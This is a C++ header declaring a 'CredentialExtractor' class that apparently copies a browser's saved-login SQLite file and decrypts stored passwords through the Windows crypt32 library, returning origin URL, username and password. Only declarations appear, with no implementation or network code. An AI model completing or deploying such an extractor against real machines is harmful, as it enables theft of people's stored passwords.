#ifndef CREDENTIAL_EXTRACTOR_H
#define CREDENTIAL_EXTRACTOR_H

/* COMPILATION
*   Link crypt32.lib (From Windows SDK)
*   Include sqlite3
*/

struct Credential
{
    char* originUrl;
    char* username;
    char* password;

    virtual ~Credential()
    {
        delete[] originUrl;
        delete[] username;
        delete[] password;
    };
};

class CredentialExtractor
{
    public:
        CredentialExtractor(const char* loginDataPath, const char* copyPath);
        virtual ~CredentialExtractor();
        int CountCredentials();
        char* DecryptPassword(int row);
        Credential GetCredential(int row);
    protected:
    private:
};

#endif // CREDENTIAL_EXTRACTOR_H
